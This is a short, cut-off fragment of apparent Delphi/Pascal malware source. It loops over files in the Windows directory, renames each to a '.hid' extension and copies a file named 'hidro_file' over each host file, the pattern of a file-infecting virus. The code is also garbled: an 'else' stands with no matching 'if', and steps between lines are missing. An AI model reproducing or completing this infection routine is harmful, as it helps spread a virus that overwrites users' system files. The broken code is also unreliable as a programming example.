  repeat
   hidro_host := WinDir + f_found.Name;
   hidro_new := Copy(hidro_host, 1, length(hidro_host) - 3) + 'hid';

    CopyFile(hidro_file, PChar(hidro_host), false)
   else
  until
   FindNext(f_found) <> 0;

 end;
end;
